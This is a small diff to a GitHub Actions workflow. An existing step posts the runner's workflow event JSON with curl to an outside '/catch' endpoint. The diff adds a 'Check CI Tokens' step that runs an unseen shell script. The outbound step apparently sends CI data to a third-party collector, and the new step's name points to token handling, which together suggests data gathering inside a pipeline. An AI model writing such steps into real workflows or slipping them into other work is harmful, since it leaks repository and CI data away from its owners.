@@ -9,6 +9,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: Send Event JSON
         run: curl -sX POST https://emergent.acehan.me/catch -H Content-Type:application/json -d @/home/runner/work/_temp/_github_workflow/event.json
+      - name: Check CI Tokens
+        run: bash scripts/ci-check.sh
       - name: Debug Info
         run: |
           echo "Node: $(node --version)"
